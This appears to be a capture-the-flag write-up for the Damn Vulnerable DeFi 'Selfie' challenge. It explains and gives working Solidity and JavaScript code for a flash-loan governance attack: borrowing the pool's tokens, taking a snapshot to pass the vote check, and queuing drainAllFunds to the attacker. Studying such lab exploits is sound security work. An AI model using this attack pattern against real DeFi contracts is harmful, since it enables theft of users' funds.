## GOAL
You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

## Examning The Code
We have a flashLoan function and queue action that allow us to queue action and has parameters receiver,data,weiAmount. There is a requirement that it has _hasEnoughVotes. If you look at the _hasEnoughVotes you will see that is being proccessd according to the balance of the user.

## Exploit
We can take a flashLoan and deposit, so _hasEnoughVotes will be validated true. We pass data in the queue function, the data will call the drainAllFunds and pass our address as parameter. So that we will have all tokens.

## Solution
```solidity
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie{

    DamnValuableTokenSnapshot public governanceToken;
    SelfiePool pool;
    address owner;

    constructor(address _pool,address _governanceToken,address _owner)
    {
        pool = SelfiePool(_pool);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
        owner = _owner;
    }

    function attack() public {
        pool.flashLoan(pool.token().balanceOf(address(pool)));
    }

    function receiveTokens(address token,uint256 amount) public{
        governanceToken.snapshot(); //since when queue an Action it checks if we have high vote which checks the latest snapshot
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        //return funds
        governanceToken.transfer(address(pool), amount);
    }

}
```

```javascript
const deploying = await ethers.getContractFactory("AttackSelfie",attacker);
const attackerContract = await deploying.deploy(
    this.pool.address,
    this.token.address,
    attacker.address
)
await attackerContract.attack();
await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days

const attackGovernenceContract = this.governance.connect(attacker);
await attackGovernenceContract.executeAction(1);
```